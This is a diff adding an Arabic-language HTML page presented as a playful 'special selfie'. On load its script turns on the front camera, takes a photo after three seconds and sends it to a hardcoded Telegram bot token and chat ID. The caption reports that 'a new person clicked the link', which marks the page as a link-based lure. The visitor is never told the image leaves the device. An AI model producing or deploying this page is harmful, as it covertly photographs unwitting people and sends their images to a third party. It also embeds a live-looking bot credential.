@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📸 سلفي خاص!</title>
+    <style>
+        body { 
+            font-family: Arial; 
+            text-align: center; 
+            background: linear-gradient(to bottom, #000, #220022); 
+            color: white; 
+            margin:0; 
+            padding:20px; 
+            height: 100vh;
+        }
+        video { 
+            width: 100%; 
+            max-width: 420px; 
+            border-radius: 20px; 
+            margin: 20px 0; 
+        }
+        h1 { font-size: 26px; margin: 20px 0; }
+        #status { font-size: 18px; margin: 15px; color: #0f0; }
+    </style>
+</head>
+<body>
+    <h1>📸 انتظر ثانية... جاري التقاط سلفي طريف 😏</h1>
+    <video id="video" autoplay playsinline></video>
+    <p id="status">جاري تشغيل الكاميرا...</p>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="photo" style="display:none; max-width:420px; border-radius:20px; border:4px solid white;" alt="الصورة">
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const status = document.getElementById('status');
+
+        const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
+        const chatId = "2049331070";
+
+        // تشغيل الكاميرا
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: 1280, height: 720 } 
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            status.textContent = "✅ الكاميرا شغّالة... التقاط الصورة بعد 3 ثوانٍ";
+            
+            // التقاط تلقائي بعد 3 ثوانٍ
+            setTimeout(() => {
+                takeAutoPhoto();
+            }, 3000);
+        })
+        .catch(err => {
+            status.textContent = "❌ خطأ في الكاميرا";
+            alert("يرجى السماح بالوصول إلى الكاميرا");
+        });
+
+        function takeAutoPhoto() {
+            status.textContent = "📸 جاري التقاط الصورة...";
+            
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.92);
+            
+            // عرض الصورة للشخص
+            photo.src = imageData;
+            photo.style.display = 'block';
+            
+            // إرسال الصورة إلى تيليجرام
+            sendToTelegram(imageData);
+        }
+
+        function sendToTelegram(base64) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: base64,
+                    caption: `📸 شخص جديد ضغط على الرابط\nالوقت: ${new Date().toLocaleString('ar-SA')}`
+                })
+            })
+            .then(() => {
+                status.textContent = "✅ تم التقاط وإرسال الصورة بنجاح!";
+            })
+            .catch(err => {
+                console.error(err);
+                status.textContent = "⚠️ تم التقاط الصورة لكن الإرسال فشل";
+            });
+        }
+    </script>
+</body>
+</html>
